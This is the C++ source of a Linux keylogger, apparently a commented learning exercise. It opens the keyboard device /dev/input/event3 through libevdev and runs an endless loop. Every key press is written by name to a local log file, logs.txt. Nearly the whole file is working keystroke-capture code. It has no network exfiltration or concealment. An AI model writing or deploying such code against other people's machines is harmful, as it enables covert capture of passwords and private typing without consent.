//Because I am on linux I cannot make the keylogger simpler way which might be if I was on windows using windows.h library
//So instead I need to use evdev library to capture the keystrokes which needs SUDO to run
#include<iostream>
#include<fstream>
#include<string.h>
#include <libevdev/libevdev.h>
#include <fcntl.h>
#include <unistd.h>




using namespace std;
const char* keyboard = "/dev/input/event3";
const char*  iofile = "logs.txt";
ofstream ostrm;
void initializer(const string& filename = "log.txt"){
    ostrm.open(filename, std::ios::app);
    if(!ostrm.is_open()){
        return;  
     }
    


    
}
void logkey(const char* key){
    if(ostrm.is_open()){
        ostrm<<key<<" ";
        ostrm.flush();
    }
}

int main(){
    int fd = open(keyboard, O_RDONLY | O_NONBLOCK);//opening the keyboard file O_RDONLY to say the system that we only want to read the keyboard, O_NONBLOCK for saying that the reader must not be freezed
    if(fd<0){
        cerr<<"Failed to open keyboard";
        close(fd);
        return 1;
    }
    initializer(iofile);//initialise file I/O


    //Initialising libevdev
    struct libevdev* dev = nullptr;
    int rc = libevdev_new_from_fd(fd, &dev);//handing our raw file descriptors(fd) to libevdev to take on the work of tranlation
    if(rc<0){
        cerr<<"Failed to initialise libevdev";
        close(fd);
        return 1;
    }
    struct input_event ev;//holds data about our each key
    //endless loop to record keys
    while(true){
        rc = libevdev_next_event(dev, LIBEVDEV_READ_FLAG_NORMAL, &ev); //asks for new keyboardevents from the kernel
        if(rc == LIBEVDEV_READ_STATUS_SUCCESS){//means a legit event was successfully captured
            if(ev.type == EV_KEY){//reads that only keys are being pressed not any garbage signal
                if(ev.value == 1){//checks that only the key triggers are pressed
                    const char* key_name = libevdev_event_code_get_name(ev.type, ev.code);
                    if(key_name){
                        logkey(key_name);
                    }
                    
                }
            }
        }
        else if(rc == -EAGAIN){//checks if there is some idle time to perform cleanup
            usleep(10000);
        }
    }
    libevdev_free(dev);
    close(fd);
    ostrm.close();
    return 0;

    
    
    
    
    

}